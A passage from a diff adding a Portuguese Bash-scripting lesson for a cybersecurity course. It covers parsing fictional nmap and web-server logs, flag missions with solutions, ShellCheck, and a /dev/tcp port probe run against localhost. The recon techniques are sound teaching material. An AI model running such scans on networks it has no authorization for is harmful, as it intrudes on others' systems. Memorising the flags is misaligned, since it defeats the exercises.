+   ainda não existir, veja a seção 5.1 do 0.3):
+
+   ```bash
+   cd ~/projetos/plataforma-cyber
+   npm run lab:sandbox
+   ```
+
+   O prompt muda para `aluno@sandbox:~$`.
+
+<Callout variant="warning" title="Um laboratório por vez">
+O sandbox conta na regra de um lab por vez. Se o Kali ou outro alvo estiver no ar, o
+script recusa e mostra qual está rodando; desligue-o em **Laboratórios** ou com
+`scripts/lab.sh down <lab>`.
+</Callout>
+
+2. Gere os dados das missões. O bloco abaixo cria a pasta `~/missao-0.6` com uma
+   varredura e três logs **fictícios**. Ele usa um gerador de números com semente fixa,
+   então todo mundo recebe exatamente os mesmos arquivos (e as mesmas flags). Copie o
+   bloco inteiro, cole no sandbox e aperte Enter. Não precisa entender o `awk` agora;
+   ele só fabrica os dados.
+
+```bash
+mkdir -p ~/missao-0.6/logs && cd ~/missao-0.6 && awk '
+function rnd() { seed = (seed * 16807) % 2147483647; return seed / 2147483647 }
+BEGIN {
+    seed = 6062026
+    np = split("21 22 23 25 53 80 110 139 443 445 3306 3389 5432 8080 8443", port, " ")
+    split("ftp ssh telnet smtp domain http pop3 netbios-ssn https microsoft-ds mysql ms-wbt-server postgresql http-proxy https-alt", svc, " ")
+    out = "varredura.gnmap"
+    print "# Varredura FICTICIA do modulo 0.6, no formato -oG (grepable) do nmap" > out
+    print "# Equivale a: nmap -p 21,22,23,25,53,80,110,139,443,445,3306,3389,5432,8080,8443 -oG varredura.gnmap 192.168.0.0/24" > out
+    for (h = 1; h < 255; h++) {
+        if (rnd() > 0.16) continue
+        up++; open = 0
+        for (i = 1; i <= np; i++) {
+            r = rnd(); st[i] = (r < 0.22) ? "open" : (r < 0.9 ? "closed" : "filtered")
+            if (st[i] == "open") open++
+        }
+        if (open == 0) st[2] = "open"
+        list = ""
+        for (i = 1; i <= np; i++) list = list (i > 1 ? ", " : "") port[i] "/" st[i] "/tcp//" svc[i] "///"
+        print "Host: 192.168.0." h " ()\tStatus: Up" > out
+        print "Host: 192.168.0." h " ()\tPorts: " list > out
+    }
+    print "# Nmap done -- 256 IP addresses (" up " hosts up)" > out
+}' && awk '
+function rnd() { seed = (seed * 16807) % 2147483647; return seed / 2147483647 }
+function add(ip, path, st, size, ua) { n++; E[n] = ip "|" path "|" st "|" size "|" ua }
+function burst(k,   i) { for (i = 0; i < k; i++) add("203.0.113.45", "/" word[1 + int(rnd() * nw)] (rnd() < 0.5 ? "" : ".old"), 404, 196, "gobuster/3.6") }
+BEGIN {
+    seed = 9092024
+    np = split("/ /index.php /login.php /sobre.html /contato.html /css/site.css /js/app.js /img/logo.png /produtos.php", page, " ")
+    nw = split("admin backup.zip .git/HEAD .env config.php.bak phpmyadmin wp-login.php server-status test old dev uploads db.sql cgi-bin/ shell.php", word, " ")
+    split("Jul Aug Sep", mon, " ")
+    for (f = 1; f <= 3; f++) {
+        n = 0; t = 0
+        name = (f == 3) ? "logs/acesso 2024-09.log" : "logs/acesso-2024-0" (6 + f) ".log"
+        cut = (f == 1) ? -1 : 400 + int(rnd() * 400)
+        for (i = 0; i < 900; i++) {
+            if (i == cut) burst(f == 2 ? 30 : 135)
+            r = rnd()
+            if (f < 3 && r < 0.045) add("198.51.100.23", "/catalogo/item-" int(rnd() * 900) ".html", 404, 196, "LinkChecker/10.2")
+            else if (r < 0.10) add("198.51.100.140", "/api/status", 200, 404, "monitor/1.0")
+            else {
+                st = (rnd() < 0.04) ? 404 : (rnd() < 0.15 ? 304 : 200)
+                add("192.168.0." (10 + int(rnd() * 50)), st == 404 ? "/pagina-antiga.html" : page[1 + int(rnd() * np)], st, st == 304 ? 0 : 200 + int(rnd() * 9000), "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0")
+            }
+        }
+        for (i = 1; i <= n; i++) {
+            split(E[i], e, "|")
+            t += (e[5] ~ /^gobuster/) ? int(rnd() * 2) : 1 + int(rnd() * 2500)
+            printf "%s - - [%02d/%s/2024:%02d:%02d:%02d -0300] \"GET %s HTTP/1.1\" %d %d \"-\" \"%s\"\n", e[1], 1 + int(t / 86400), mon[f], int(t / 3600) % 24, int(t / 60) % 60, t % 60, e[2], e[3], e[4], e[5] > name
+        }
+        close(name)
+    }
+}'
+```
+
+3. Confira que tudo foi criado (saída real):
+
+```console
+$ cd ~/missao-0.6
+$ ls -R
+.:
+logs  varredura.gnmap
+
+./logs:
+'acesso 2024-09.log'   acesso-2024-07.log   acesso-2024-08.log
+$ wc -l logs/*
+  1035 logs/acesso 2024-09.log
+   900 logs/acesso-2024-07.log
+   930 logs/acesso-2024-08.log
+  2865 total
+$ head -4 varredura.gnmap
+# Varredura FICTICIA do modulo 0.6, no formato -oG (grepable) do nmap
+# Equivale a: nmap -p 21,22,23,25,53,80,110,139,443,445,3306,3389,5432,8080,8443 -oG varredura.gnmap 192.168.0.0/24
+Host: 192.168.0.3 ()	Status: Up
+Host: 192.168.0.3 ()	Ports: 21/open/tcp//ftp///, 22/closed/tcp//ssh///, 23/closed/tcp//telnet///, 25/closed/tcp//smtp///, 53/closed/tcp//domain///, 80/closed/tcp//http///, 110/closed/tcp//pop3///, 139/closed/tcp//netbios-ssn///, 443/closed/tcp//https///, 445/closed/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 3389/closed/tcp//ms-wbt-server///, 5432/closed/tcp//postgresql///, 8080/open/tcp//http-proxy///, 8443/closed/tcp//https-alt///
+```
+
+Repare em dois detalhes que vão importar: o `ls` mostra um dos logs entre aspas, porque
+o nome dele tem um **espaço**; e cada host aparece em **duas** linhas da varredura, uma
+de `Status` e uma de `Ports`.
+
+<Callout variant="tip" title="Como escrever os scripts">
+Você pode criar cada script com o nano (0.4), por exemplo `nano resumo.sh`, ou colando
+um here-doc como `cat > resumo.sh <<'FIM'` ... `FIM`. Se algo der muito errado, recomece
+do zero: saia do sandbox, rode `npm run lab:sandbox -- reset` no WSL e repita o passo 2.
+</Callout>
+
+### 5.2 Missão 1 — Seu primeiro script de recon (guiada)
+
+**Objetivo:** escrever o `resumo.sh`, que recebe uma varredura `-oG` e informa quantos
+hosts responderam e quantas portas abertas existem no total, recusando entradas
+inválidas com códigos de saída diferentes.
+
+**Etapa 1: o esqueleto.** Crie o arquivo com o shebang, as opções de robustez e uma
+função de ajuda:
+
+```bash
+#!/usr/bin/env bash
+# resumo.sh — quantos hosts responderam e quantas portas abertas há
+# numa varredura no formato grepable (-oG) do nmap.
+set -euo pipefail
+
+usage() {
+    echo "uso: $0 ARQUIVO.gnmap" >&2
+    exit 2
+}
+```
+
+**Etapa 2: validar a entrada.** Um script de recon nunca deve "tentar mesmo assim" com
+uma entrada errada; ele para e diz por quê. Acrescente:
+
+```bash
+[ "$#" -eq 1 ] || usage
+scan_file=$1
+
+if [ ! -r "$scan_file" ]; then
+    echo "erro: não consigo ler '$scan_file'" >&2
+    exit 3
+fi
+```
+
+A primeira linha lê-se: "o número de argumentos é 1, **ou então** mostre o uso". A
+convenção de códigos usada aqui (2 para uso errado, 3 para arquivo ilegível) é uma
+escolha do script; o importante é que cada falha tenha um código diferente de 0, para
+que outro script possa reagir.
+
+**Etapa 3: contar.** Pense em como contar hosts: cada host tem exatamente uma linha com
+`Status: Up`. Para as portas, cuidado: uma linha tem várias portas, então contar
+**linhas** não basta. O `grep -o` imprime cada ocorrência numa linha própria, e aí sim
+o `wc -l` conta ocorrências:
+
+```bash
+hosts_up=$(grep -c 'Status: Up' "$scan_file")
+open_ports=$(grep -o '/open/' "$scan_file" | wc -l)
+
+echo "arquivo: $scan_file"
+echo "hosts ativos: $hosts_up"
+echo "portas abertas: $open_ports"
+```
+
+Por que procurar `/open/`, com as barras, e não só `open`? Porque o texto `open` pode
+aparecer em outros lugares (um serviço chamado `openvpn`, por exemplo). As barras
+prendem o padrão ao subcampo de estado.
+
+**Etapa 4: testar os caminhos de erro primeiro.** Dê permissão de execução e teste os
+dois erros (saída real):
+
+```console
+$ chmod +x resumo.sh
+$ ./resumo.sh; echo "codigo: $?"
+uso: ./resumo.sh ARQUIVO.gnmap
+codigo: 2
+$ ./resumo.sh nao-existe.gnmap; echo "codigo: $?"
+erro: não consigo ler 'nao-existe.gnmap'
+codigo: 3
+```
+
+Testar o caminho de erro antes do caminho feliz é um hábito de quem escreve ferramentas
+confiáveis: é o caminho que menos se testa e o que mais causa estrago.
+
+**Etapa 5: a flag.** Agora rode o script na varredura de verdade e confira que o código
+de saída é 0:
+
+```console
+$ ./resumo.sh varredura.gnmap; echo "codigo: $?"
+```
+
+Anote os dois números. A flag é `FLAG{hosts-portas}`; por exemplo, se o script dissesse
+10 hosts e 25 portas, a flag seria `FLAG{10-25}`.
+
+<Hint title="Dica 1">
+Se `portas abertas` deu um número igual ao de hosts, você contou linhas, não
+ocorrências. Releia a etapa 3: `grep -c` conta linhas que casam; `grep -o ... | wc -l`
+conta cada ocorrência.
+</Hint>
+
+<Hint title="Dica 2">
+Se o script terminou em silêncio, sem imprimir nada, rode-o com `bash -x resumo.sh
+varredura.gnmap` e veja qual foi o último comando antes de parar. Com `set -e`, um
+`grep -c` que não acha nada devolve 1 e encerra o script: confira se o padrão está
+escrito exatamente como no arquivo, com maiúsculas.
+</Hint>
+
+<Solution title="Solução da Missão 1">
+O script completo é a junção das etapas 1, 2 e 3, nessa ordem. Ao rodá-lo na varredura,
+ele imprime o número de linhas `Status: Up` (os hosts ativos) e o total de ocorrências
+de `/open/` (as portas abertas), com código 0. Para conferir sem o script:
+
+```console
+$ grep -c 'Status: Up' varredura.gnmap
+$ grep -o '/open/' varredura.gnmap | wc -l
+```
+
+Os dois números, nessa ordem, vão no formato `FLAG{hosts-portas}`.
+</Solution>
+
+<FlagInput task="missao-1-primeiro-script" />
+
+### 5.3 Missão 2 — Da varredura às URLs (desafio)
+
+**Objetivo:** escrever o `urls-web.sh`, que lê a varredura e imprime, uma por linha, a
+URL de cada serviço web **aberto**, seguindo a regra que navegadores e ferramentas usam:
+
+| Porta aberta | URL gerada |
+|---|---|
+| 80 | `http://IP/` (porta padrão do HTTP: não se escreve) |
+| 443 | `https://IP/` (porta padrão do HTTPS: não se escreve) |
+| 8080 | `http://IP:8080/` |
+| 8443 | `https://IP:8443/` |
+
+As outras portas são ignoradas. Essa lista é exatamente o que você passaria para a
+próxima ferramenta de um pentest web.
+
+**A armadilha.** Antes de começar, veja por que um `grep` direto não serve (saída real):
+
+```console
+$ grep -c "80/open" varredura.gnmap
+15
+```
+
+Quinze linhas casam com `80/open`, mas isso inclui todas as linhas com `8080/open`,
+porque `80/open` está **dentro** de `8080/open`. Para acertar, o script precisa separar
+cada porta e comparar o número inteiro. É um erro típico de parsing com texto: um
+padrão curto demais casa coisas que você não queria.
+
+**O caminho (o diagrama da seção 3.1 mostra o fluxo):**
+
+1. Valide a entrada com `${1:?...}`.
+2. Pegue só as linhas `Ports:` com `grep`.
+3. Leia cada linha com um `while` cujo `IFS` seja o **tab**, separando o campo
+   `Host: ...` do campo `Ports: ...`. No Bash, um tab literal se escreve `$'\t'`.
+4. Recorte o IP com expansões de parâmetro (seção 2.2): tire o prefixo `Host: ` e
+   depois tudo a partir do primeiro espaço.
+5. Transforme a lista de portas, separada por `, `, em uma porta por linha, e leia cada
+   uma com um segundo `while`, agora com `IFS=/`.
+6. Pule as que não estão abertas e use um `case` para montar a URL.
+
+Um esqueleto para completar:
+
+```bash
+#!/usr/bin/env bash
+# urls-web.sh — monta as URLs dos serviços web abertos de uma varredura -oG.
+set -euo pipefail
+
+scan_file=${1:?uso: $0 ARQUIVO.gnmap}
+
+grep 'Ports:' "$scan_file" | while IFS=$'\t' read -r host_field ports_field; do
+    ip=...        # recorte o IP de host_field
+    ports=...     # tire o "Ports: " de ports_field
+
+    while IFS=/ read -r port state _; do
+        ...       # pule as portas que não estão abertas
+        case $port in
+            ...   # uma linha por porta web
+        esac
+    done <<< "..."  # entregue as portas, uma por linha
+done
+```
+
+O `<<<` no fim do laço interno é uma <GlossaryTerm term="here string">here string</GlossaryTerm>:
+ele entrega um texto como stdin do comando, como um
+<GlossaryTerm term="here document">here-doc</GlossaryTerm> de uma linha só. E o `_` no
+`read` é um nome de variável como outro qualquer, usado por convenção para "o resto, que
+não me interessa".
+
+Quando o script funcionar, as primeiras linhas devem ser estas (saída real):
+
+```console
+$ ./urls-web.sh varredura.gnmap | head -5
+http://192.168.0.3:8080/
+https://192.168.0.8/
+https://192.168.0.13/
+http://192.168.0.13:8080/
+https://192.168.0.43/
+```
+
+**A flag** tem duas partes: o **total** de URLs que o script imprime e **quantas delas
+não têm porta explícita** (as de 80 e 443). Use pipes para contar; não conte no olho.
+Formato: `FLAG{total-sem_porta}`.
+
+<Hint title="Dica 1">
+Para recortar o IP de `Host: 192.168.0.3 ()`: `${host_field#Host: }` tira o prefixo; em
+seguida, `${ip%% *}` tira tudo do primeiro espaço até o fim. Para a lista de portas,
+`${ports//, /$'\n'}` troca cada `, ` por uma quebra de linha.
+</Hint>
+
+<Hint title="Dica 2">
+Para contar o total, `| wc -l`. Para contar as URLs sem porta, filtre as linhas que
+**não** têm `:número/` no fim: `grep -v` inverte o filtro, e `grep -c` conta. Uma
+expressão regular que casa `:8080/` ou `:8443/` no fim da linha é `:[0-9]*/$`.
+</Hint>
+
+<Solution title="Solução da Missão 2">
+```bash
+#!/usr/bin/env bash
+# urls-web.sh — monta as URLs dos serviços web abertos de uma varredura -oG.
+set -euo pipefail
+
+scan_file=${1:?uso: $0 ARQUIVO.gnmap}
+
+# Lê só as linhas "Ports:"; IFS=$'\t' separa o "Host: ..." do "Ports: ...".
+grep 'Ports:' "$scan_file" | while IFS=$'\t' read -r host_field ports_field; do
+    ip=${host_field#Host: }      # tira o prefixo "Host: "
+    ip=${ip%% *}                 # tira tudo a partir do primeiro espaço
+    ports=${ports_field#Ports: }
+
+    # Cada porta vem separada por ", ": troca por quebra de linha e lê uma a uma.
+    while IFS=/ read -r port state _; do
+        [ "$state" = open ] || continue
+        case $port in
+            80)   echo "http://$ip/" ;;
+            443)  echo "https://$ip/" ;;
+            8080) echo "http://$ip:8080/" ;;
+            8443) echo "https://$ip:8443/" ;;
+        esac
+    done <<< "${ports//, /$'\n'}"
+done
+```
+
+Para a flag:
+
+```console
+$ ./urls-web.sh varredura.gnmap | wc -l
+$ ./urls-web.sh varredura.gnmap | grep -vc ':[0-9]*/$'
+```
+
+O primeiro número é o total; o segundo, as URLs sem porta. Repare que o `case` compara o
+número **inteiro** da porta: `80)` não casa com `8080`, que era a armadilha do `grep`.
+</Solution>
+
+<FlagInput task="missao-2-urls-web" />
+
+### 5.4 Missão 3 — O script que mente (desafio)
+
+Um colega escreveu um script para descobrir qual IP mais recebeu respostas 404 nos logs
+do servidor, o sinal de uma varredura de diretórios (seção 3.2). Ele rodou, viu um
+resultado, e ia pôr esse IP no relatório. Crie o script exatamente como ele escreveu
+(cole o bloco inteiro):
+
+```bash
+cat > top404.sh <<'FIM'
+#!/bin/sh
+# top404.sh — mostra o IP que mais recebeu respostas 404 nos logs de acesso.
+# (Este script tem bugs. Sua missão é achá-los.)
+
+dir=$1
+
+if [[ -z $dir ]]; then
+    echo "uso: $0 PASTA_DE_LOGS"
+    exit 1
+fi
+
+for f in $(ls $dir/*.log); do
+    grep " 404 " $f
+done | cut -d' ' -f1 | sort | uniq -c | sort -rn | head -n 1
+FIM
+chmod +x top404.sh
+```
+
+Rode como ele rodou (saída real):
+
+```console
+$ ./top404.sh logs; echo "codigo: $?"
+./top404.sh: 7: [[: not found
+grep: logs/acesso: No such file or directory
+grep: 2024-09.log: No such file or directory
+     90 198.51.100.140
+codigo: 0
+```
+
+Três mensagens de erro e, mesmo assim, um resultado e código 0, "sucesso". O IP
+198.51.100.140 foi apontado como o atacante. Ele é?
+
+**Sua missão:** encontrar e corrigir os **três** bugs do `top404.sh` e descobrir quem
+realmente fez a varredura de diretórios. Cada bug, sozinho, já muda a resposta. Use o que
+você aprendeu: leia cada mensagem de erro, use `bash -x` e olhe as linhas do log com os
+próprios olhos (`grep '^198.51.100.140 ' logs/acesso-2024-07.log | head -3`).
+
+**A flag:** o IP e a contagem que o script **corrigido** imprime, no formato
+`FLAG{ip-contagem}`. Por exemplo, se a linha fosse `   12 192.0.2.1`, a flag seria
+`FLAG{192.0.2.1-12}`.
+
+<Hint title="Dica 1 — o primeiro erro">
+`[[: not found` na linha 7: quem está lendo o script? Olhe o shebang e rode
+`ls -l /bin/sh`. O `[[` é um recurso de qual shell (seção 2.4)?
+</Hint>
+
+<Hint title="Dica 2 — o segundo erro">
+O grep reclamou de `logs/acesso` e de `2024-09.log`, dois "arquivos" que não existem.
+De onde saíram esses nomes? Releia o exemplo B do diagrama da seção 2.2 e lembre qual
+log tem espaço no nome.
+</Hint>
+
+<Hint title="Dica 3 — o terceiro erro, o mais traiçoeiro">
+Esse não gera mensagem nenhuma. Veja três linhas do suposto atacante e compare com o
+formato do Combined Log Format (seção 3.2): o 404 dessas linhas está no campo do status
+ou no campo do tamanho? Qual comando compara um **campo** específico, e não a linha
+inteira?
+</Hint>
+
+<Solution title="Solução da Missão 3">
+Os três bugs:
+
+1. **Shebang errado.** `#!/bin/sh` no Debian é o dash, um shell POSIX que não conhece
+   `[[`. O teste falhou com código 127, o `if` tratou isso como "falso" e o script
+   seguiu sem validar nada. Correção: `#!/usr/bin/env bash` (e, de quebra,
+   `${1:?...}` para validar).
+2. **Laço sobre a saída do `ls`.** `$(ls $dir/*.log)` devolve texto, e o word splitting
+   quebrou `logs/acesso 2024-09.log` em dois nomes inexistentes. O log de setembro
+   inteiro ficou de fora. Correção: deixar o glob listar, `for f in "$dir"/*.log`, e pôr
+   aspas em `"$f"`.
+3. **grep na linha inteira.** `grep " 404 "` casa também as respostas de **404 bytes**
+   com status 200: é o que o monitor 198.51.100.140 recebe a cada consulta a
+   `/api/status`. Correção: comparar o campo do status com `awk '$9 == 404'`.
+
+E um quarto problema, de projeto: o script devolveu 0 mesmo com erros. Com
+`set -euo pipefail`, o erro do grep não sumiria no meio do pipeline.
+
+```bash
+#!/usr/bin/env bash
+# top404.sh — mostra o IP que mais recebeu respostas 404 nos logs de acesso.
+set -euo pipefail
+
+dir=${1:?uso: $0 PASTA_DE_LOGS}
+
+for f in "$dir"/*.log; do
+    awk '$9 == 404 { print $1 }' "$f"
+done | sort | uniq -c | sort -rn | head -n 1
+```
+
+Rode `./top404.sh logs` e use a linha impressa para montar a flag. Para confirmar que
+achou o atacante certo, olhe as linhas desse IP: user agent de ferramenta, caminhos de
+wordlist e intervalos de zero a um segundo entre as requisições.
+</Solution>
+
+<FlagInput task="missao-3-script-quebrado" />
+
+Ao terminar, saia do sandbox com `exit`. Se não for usá-lo de novo agora, desligue-o em
+**Laboratórios** ou com `scripts/lab.sh down linux-sandbox`, para liberar a regra de um
+lab por vez.
+
+### 5.5 Walkthrough no WSL: ShellCheck e uma porta sem nmap (sem flag)
+
+O <GlossaryTerm term="ShellCheck">ShellCheck</GlossaryTerm> é uma ferramenta livre que lê
+scripts de shell e aponta bugs e padrões perigosos, cada um com um código e uma
+explicação. É um <GlossaryTerm term="linter">linter</GlossaryTerm>: um programa que
+analisa o código **sem executá-lo**. Ele não está no sandbox (que não tem rede para
+instalar nada), então este passo é no seu WSL.
+
+1. Instale pelo `apt` (0.4). No Ubuntu 26.04, o pacote disponível é a versão 0.11.0:
+
+   ```bash
+   sudo apt update && sudo apt install shellcheck
+   shellcheck --version
+   ```
+
+2. Crie no WSL uma cópia do `top404.sh` **original** da Missão 3 (o mesmo bloco
+   `cat > top404.sh <<'FIM'` da seção 5.4, numa pasta como `~/scripts-0.6`) e rode o
+   ShellCheck nele. Saída real, com a versão 0.11.0:
+
+```console
+$ shellcheck top404.sh
+
+In top404.sh line 7:
+if [[ -z $dir ]]; then
+   ^-----------^ SC3010 (warning): In POSIX sh, [[ ]] is undefined.
+
+
+In top404.sh line 12:
+for f in $(ls $dir/*.log); do
+         ^--------------^ SC2045 (error): Iterating over ls output is fragile. Use globs.
+              ^--^ SC2086 (info): Double quote to prevent globbing and word splitting.
+
+Did you mean:
+for f in $(ls "$dir"/*.log); do
+
+
+In top404.sh line 13:
+    grep " 404 " $f
+                 ^-- SC2086 (info): Double quote to prevent globbing and word splitting.
+
+Did you mean:
+    grep " 404 " "$f"
+
+For more information:
+  https://www.shellcheck.net/wiki/SC2045 -- Iterating over ls output is fragi...
+  https://www.shellcheck.net/wiki/SC3010 -- In POSIX sh, [[ ]] is undefined.
+  https://www.shellcheck.net/wiki/SC2086 -- Double quote to prevent globbing ...
+```
+
+O ShellCheck achou sozinho dois dos três bugs: o `[[` num script `sh` (SC3010) e o laço
+sobre o `ls` (SC2045), além das variáveis sem aspas (SC2086, o aviso mais comum de
+todos). Mas ele **não** achou o terceiro, o `grep " 404 "`, porque esse não é um erro de
+código: a sintaxe está perfeita, e o problema está no significado dos dados. Nenhum
+linter substitui conhecer o formato que você está lendo e testar com dados reais. A
+versão corrigida da Missão 3 passa sem nenhum aviso.
+
+3. **Uma porta sem nmap.** O Bash tem um recurso pouco conhecido: redirecionar para o
+   caminho especial `/dev/tcp/HOST/PORTA` faz o próprio Bash abrir uma conexão TCP. Não
+   é um arquivo de verdade; o Bash intercepta esse nome. Atacantes usam isso em máquinas
+   sem nmap nem netcat, e você pode usar para testar uma porta rapidamente. Com a
+   plataforma rodando (`npm run dev`), teste as portas da **sua própria máquina**, em
+   `127.0.0.1`:
+
+```bash
+porta_aberta() {
+    timeout 2 bash -c "</dev/tcp/$1/$2" 2>/dev/null
+}
+
+for porta in 3000 3001; do
+    if porta_aberta 127.0.0.1 "$porta"; then
+        echo "127.0.0.1:$porta aberta"
+    else
+        echo "127.0.0.1:$porta fechada"
+    fi
+done
+```
+
+Saída real, com a plataforma no ar:
+
+```console
+127.0.0.1:3000 aberta
+127.0.0.1:3001 fechada
+```
+
+O `timeout 2` evita que o teste fique parado esperando uma porta filtrada. Só use isso
+contra `127.0.0.1` ou contra alvos que você tem autorização para testar: um laço desses
+sobre uma rede inteira **é** uma varredura de portas.
+
+## 6. Variações e aprofundamento
+
+### 6.1 Arrays e arrays associativos
+
+Um <GlossaryTerm term="array">array</GlossaryTerm> guarda uma lista indexada por números,
+e é a forma correta de guardar uma lista de itens que podem ter espaços (uma variável
+comum com itens separados por espaço quebra nos espaços, como você viu). Um
+<GlossaryTerm term="associative array">array associativo</GlossaryTerm>, declarado com
+`declare -A`, é indexado por texto, como um dicionário do Python. Saída real:
+
+```console
+$ portas=(22 80 443); echo "${#portas[@]} portas: ${portas[*]}"; echo "primeira: ${portas[0]}"
+3 portas: 22 80 443
+primeira: 22
+$ declare -A servico=([22]=ssh [80]=http); for p in "${!servico[@]}"; do echo "$p -> ${servico[$p]}"; done | sort -n
+22 -> ssh
+80 -> http
+```
+
+`"${portas[@]}"` (com aspas) expande cada item como uma palavra, como o `"$@"`;
+`"${!servico[@]}"` lista as chaves. Arrays associativos são ótimos para contar: o
+exercício extra 3 da seção 9 conta portas abertas por serviço com um deles.
+
+### 6.2 getopts: opções como as de um comando de verdade
+
+Quando um script cresce, ele passa a aceitar opções (`-p 8080`, `-v`). O builtin
+<GlossaryTerm term="getopts">getopts</GlossaryTerm> as lê de forma padronizada. Na string
+`':p:v'`, cada letra é uma opção; os dois-pontos depois do `p` dizem que ela exige um
+valor; o `:` no começo pede que os erros venham para o seu `case`:
+
+```bash
+#!/usr/bin/env bash
+porta=80; verbose=0
+while getopts ':p:v' opt; do
+    case $opt in
+        p) porta=$OPTARG ;;
+        v) verbose=1 ;;
+        :) echo "erro: -$OPTARG precisa de um valor" >&2; exit 2 ;;
+        \?) echo "erro: opção inválida -$OPTARG" >&2; exit 2 ;;
+    esac
+done
+shift $((OPTIND - 1))
+echo "porta=$porta verbose=$verbose resto=$*"
+```
+
+```console
+$ bash opcoes.sh -v -p 8080 192.168.0.10
+porta=8080 verbose=1 resto=192.168.0.10
+$ bash opcoes.sh -x; echo "rc=$?"
+erro: opção inválida -x
+rc=2
+$ bash opcoes.sh -p; echo "rc=$?"
+erro: -p precisa de um valor
+rc=2
+```
+
+O `shift $((OPTIND - 1))` descarta as opções já lidas e deixa em `"$@"` só os argumentos
+restantes (o alvo, no exemplo).
+
+### 6.3 O while que perde as variáveis, e a substituição de processo
+
+Lembra que cada lado de um pipe roda num subshell (seção 2.1)? Isso tem uma consequência
+que confunde todo mundo uma vez (saída real):
+
+```console
+$ n=0; printf "a\nb\nc\n" | while read -r l; do n=$((n+1)); done; echo "pipe: $n"
+pipe: 0
+$ n=0; while read -r l; do n=$((n+1)); done < <(printf "a\nb\nc\n"); echo "process substitution: $n"
+process substitution: 3
+```
+
+No primeiro caso, o `while` rodou num subshell e contou 3, mas a variável morreu com
+ele. No segundo, a <GlossaryTerm term="process substitution">process substitution</GlossaryTerm>
+`<(comando)` entrega a saída do `printf` como se fosse um arquivo, e o `<` a redireciona
+para o `while`, que agora roda no shell atual. É por isso que a Missão 2 pôde usar
+`grep | while`: ela só imprime, não precisa guardar nada depois do laço.
+
+### 6.4 printf no lugar de echo
+
+O `echo` muda de comportamento entre shells e versões (alguns interpretam `\t`, outros
+não). O `printf` é padronizado e permite alinhar colunas, o que deixa relatórios
+legíveis (saída real):
+
+```console
+$ printf '%-15s %5s\n' "192.168.0.10" 80 "192.168.0.123" 8080
+192.168.0.10       80
+192.168.0.123    8080
+$ echo -e 'a\tb'; echo 'a\tb'
+a	b
+a\tb
+```
+
+`%-15s` é um texto alinhado à esquerda em 15 colunas; `%5s`, alinhado à direita em 5.
+Quando o formato tem menos campos que os argumentos, o `printf` repete o formato, por
+isso uma única chamada imprimiu as duas linhas.
+
+### 6.5 Muitos arquivos: find, xargs e nomes estranhos
+
+Para processar arquivos espalhados em pastas, o `find` do 0.3 combina com o `xargs`, que
+transforma linhas da entrada em argumentos de um comando. Como nomes de arquivo podem
+conter espaços e até quebras de linha, a forma segura usa o caractere nulo como
+separador nos dois lados:
+
+```bash
+find logs -name '*.log' -print0 | xargs -0 awk '$9 == 404 { print $1 }' | sort | uniq -c
+```
+
+`-print0` separa os nomes com o byte nulo (que não pode aparecer num nome de arquivo) e
+`xargs -0` lê assim. O `xargs -P 4` roda até 4 processos em paralelo, útil para tarefas
+lentas e independentes (lembrando que paralelizar contra um alvo de rede multiplica o
+ruído e a carga sobre ele).
+
+### 6.6 Bash, sh, dash e zsh
+
+Nem todo shell é o Bash. O `/bin/sh` é o shell <GlossaryTerm term="POSIX">POSIX</GlossaryTerm>
+padrão do sistema, e qual programa ele é depende da distribuição. No Debian e no Ubuntu
+(e no sandbox), é o <GlossaryTerm term="dash">dash</GlossaryTerm>, um shell pequeno e
+rápido, sem os recursos extras do Bash (saída real):
+
+```console
+$ ls -l /bin/sh
+lrwxrwxrwx 1 root root 4 Feb  4  2025 /bin/sh -> dash
+$ sh d.sh; echo "rc=$?"
+d.sh: 2: [[: not found
+rc=0
+```
+
+`[[ ]]`, arrays, `$'\t'`, `<<<`, `<( )` e `{1..5}` são do Bash. Se o script precisa
+rodar em qualquer `sh` (em contêineres mínimos ou roteadores, por exemplo), escreva só
+POSIX e teste com `dash`; o ShellCheck avisa o que não é POSIX (o SC3010 da seção 5.5).
+O zsh, shell padrão do Kali, é compatível com o Bash no uso interativo do dia a dia, mas
+tem diferenças em scripts (por exemplo, não faz word splitting de variáveis sem aspas por
+padrão). Por isso, scripts devem declarar o próprio interpretador no shebang em vez de
+depender do shell de quem os chama.
+
+## 7. Erros comuns
+
+**"command not found" numa atribuição.** `nome = aluno` com espaços vira o comando
+`nome`. Atribuição é `nome=aluno`, colado (seção 2.2).
+
+**"[5: command not found" ou "unary operator expected".** O `[` é um comando e precisa de
+espaços: `[ "$x" -gt 3 ]`. E variáveis vazias sem aspas somem da linha, deixando o `test`
+sem um operando. Aspas sempre, ou `[[ ]]`.
+
+**O script não roda: "Permission denied" ou "command not found".** Falta `chmod +x`
+(código 126) ou falta o `./` antes do nome (código 127). Ou rode com `bash script.sh`.
+
+**"required file not found" ou "bad interpreter" num script que parece certo.** O
+arquivo foi salvo com quebras de linha do Windows (CRLF: um caractere invisível `\r`
+antes de cada `\n`), e o kernel procura um interpretador chamado `bash\r`, que não
+existe. Acontece muito ao criar o script no Bloco de Notas ou ao copiar do Windows. A
+mensagem varia com a versão do Bash (saídas reais):
+
+```console
+$ ./crlf.sh                        # no sandbox, Bash 5.2
+bash: ./crlf.sh: cannot execute: required file not found
+$ ./crlf.sh                        # no WSL, Bash 5.3
+/bin/bash: ./crlf.sh: /bin/bash^M: bad interpreter: No such file or directory
+$ file crlf.sh
+crlf.sh: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
+$ sed -i 's/\r$//' crlf.sh; ./crlf.sh
+ola
+```
+
+O `file` denuncia o problema e o `sed` tira o `\r` do fim de cada linha.
+
+**"event not found" ao digitar um `!` entre aspas duplas.** No prompt interativo, o `!`
+ativa a <GlossaryTerm term="history expansion">history expansion</GlossaryTerm> (o `!!`
+repete o último comando, por exemplo), mesmo dentro de aspas duplas. Ao testar um shebang
+no prompt, `printf "#!/bin/bash..."` deu `bash: !/bin/bash...: event not found`. Use aspas
+simples. Dentro de scripts, a history expansion vem desligada.
+
+**O laço quebrou o nome do arquivo.** `for f in $(ls ...)` ou `for l in $(cat ...)`
+percorrem palavras, não arquivos nem linhas. Use `for f in "$dir"/*` para arquivos e
+`while IFS= read -r` para linhas (seções 2.2 e 2.5).
+
+**O script com `set -e` continuou depois de um erro.** O erro aconteceu num dos pontos
+cegos: dentro de um `if`, de um `&&`/`||`, no meio de um pipeline sem `pipefail`, ou
+numa função chamada num desses lugares (seção 2.7). E uma armadilha a mais: com `set -e`,
